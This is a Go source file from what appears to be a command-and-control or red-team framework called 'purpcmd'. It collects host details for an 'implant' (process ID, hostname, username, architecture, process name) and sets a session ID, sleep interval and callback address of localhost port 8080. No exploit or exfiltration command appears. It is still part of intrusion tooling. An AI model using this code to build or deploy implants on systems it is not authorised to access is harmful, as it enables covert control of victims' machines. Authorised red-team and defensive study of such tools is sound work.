package core

import (
	"math/rand"
	"os"
	"path/filepath"
	"purpcmd/implant"
	"purpcmd/internal"
	"runtime"
	"strings"
)

func RandInt() uint32 {
	min := 10000
	max := 99999
	return uint32(rand.Intn(max-min) + min)
}

func getArch() uint8 {
	switch runtime.GOARCH {
	case "amd64":
		return internal.AMD64
	}
	return 0
}

func getUsername() string {
	// Try USER environment variable (Linux/Unix)
	if user := os.Getenv("USER"); user != "" {
		return user
	}
	// Try USERNAME environment variable (Windows)
	if user := os.Getenv("USERNAME"); user != "" {
		return user
	}
	return "unknown"
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func getProcessName() string {
	if len(os.Args) > 0 {
		// Get the base name from the full path
		procPath := os.Args[0]
		procName := filepath.Base(procPath)
		// Remove common suffixes
		procName = strings.TrimSuffix(procName, ".exe")
		return procName
	}
	return "unknown"
}

func ImplantInit() *implant.ImplantMetadata {
	return &implant.ImplantMetadata{
		PID:       uint32(os.Getpid()),
		SessionID: RandInt(),
		IP:        2130706433,
		Sleep:     10,
		Port:      8080,
		Arch:      getArch(),

		Proc:     getProcessName(),
		Hostname: getHostname(),
		User:     getUsername(),
		Impl:     "impl",
	}
}
